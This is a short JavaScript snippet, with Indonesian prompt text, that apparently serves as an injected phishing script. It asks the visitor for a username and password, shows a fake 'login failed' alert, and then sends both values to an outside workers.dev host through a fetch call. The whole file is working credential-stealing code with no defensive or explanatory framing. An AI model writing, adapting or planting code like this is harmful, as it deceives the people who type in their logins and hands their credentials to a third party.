(function () {
  const user = prompt("Nama pengguna:");
  if (user === null) return;

  const pass = prompt("Sandi:");
  if (pass === null) return;

  alert("Login Gagal");

  fetch("https://memek-worker.defoy89122.workers.dev/?message=" 
    + encodeURIComponent("user=" + user + "&pass=" + pass)
  );
})();
